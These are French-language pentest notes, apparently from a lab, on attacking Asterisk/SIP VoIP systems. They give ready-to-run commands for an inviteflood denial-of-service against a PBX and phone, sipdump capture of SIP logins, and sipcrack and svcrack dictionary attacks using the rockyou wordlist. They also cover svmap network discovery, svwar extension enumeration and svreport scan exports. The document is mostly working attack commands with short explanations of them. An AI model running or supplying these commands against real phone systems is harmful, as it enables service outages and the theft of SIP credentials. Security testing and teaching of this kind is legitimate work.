## Attaque DDOS sur un serveur Asterisk
```Bash
inviteflood enp1s0 6001 192.168.1.21 192.168.1.39 100
```

||Description|
|---|---|
|enp1s0|Interface réseau|
|6001|Utilisateur SIP cible|
|192.168.1.21|Serveur PBX|
|192.168.1.39|Adresse IP du téléphone cible|
|100|Envoi de 100 paquets|

Comportement observé:
1. Coupure de ligne.
2. Déconnexions d’utilisateurs.

## Détecter et déchiffrer des connexions SIP avec SIPDUMP
Capture d’un login de session.
```Bash
sipdump -i enp1s0 logins.dump
```
* -i <interface> Permet d’indiquer une interface d’écoute.

* SIPCRACK permet de trouver les identifiants de connexion SIP.

Sur Kali Linux nous avons une liste de mots déjà prête du nom de "rockyou".
```Bash
cd /usr/share/wordlists/
```

On décompresse la liste de mots.
```Bash
gunzip rockyou.txt.gz
```

On lance le crack avec la liste de mots puis on indique quel est le login que nous voulons cracker puis
on valide:
```Bash
sipcrack -w /usr/share/wordlists/rockyou.txt logins.dump
```
* -w <liste de mots> liste de potentiels mot de passes, tous les mots de passes a essayer.

## Identification du serveur VoIP et des softphones ou téléphones Ip dans le réseau

```Bash
svmap 192.168.1.0/24
```

## Identification des numéros de ligne,(extension) sur le téléphone IP
```Bash
svwar -e1000-9000 192.168.1.39 -m INVITE --force
```

|Type d’authentification|Description|
|---|---|
|noauth|Extension qui ne requiert pas d’authentification.|
|reqauth|Extension qui requiert une authentification.|
|weird|L’extension existe probablement mais la réponse est
inattendue.|

Tentative pour déchiffrer le mot de passe.
```Bash
svcrack -u 6001 -d /usr/share/wordlists/rockyou.txt 192.168.1.39
```

Identification du serveur VoIP et des softphones ou téléphones IP dans le réseau.
Enregistrement d’un scan "SCAN2", (un scan du réseau à la recherche d'appareil SIP).
```Bash
svmap -s SCAN2 --randomize 192.168.1.0/24
```

Affichage de la liste des scans puis exportation d’un scan en document CSV.
```Bash
svreport list
```

```Bash
svreport export -f csv -o scan2.csv -s SAN2
```

Pour supprimer un scan.
```Bash
svreport delete -s scan1
```
